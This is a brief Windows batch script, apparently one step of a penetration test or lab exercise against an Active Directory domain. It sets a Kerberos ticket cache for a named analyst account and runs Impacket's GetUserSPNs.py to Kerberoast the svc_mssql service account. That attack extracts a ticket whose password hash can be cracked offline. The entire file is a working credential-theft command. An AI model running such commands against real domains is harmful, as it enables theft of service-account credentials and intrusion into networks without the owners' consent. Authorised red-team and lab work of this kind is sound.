@echo off
REM WT002 step 3 — Kerberoast svc_mssql only, utf-8 safe
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set KRB5CCNAME=C:\Tools\cadre-attack\analyst_t2.ccache
set PYTHONIOENCODING=utf-8

python -X utf8 %PY%\GetUserSPNs.py -k -no-pass -dc-ip dc02.child.cadre.local "child.cadre.local/analyst_t2" -request-user svc_mssql -request 2>&1
echo KERB_RC %ERRORLEVEL%
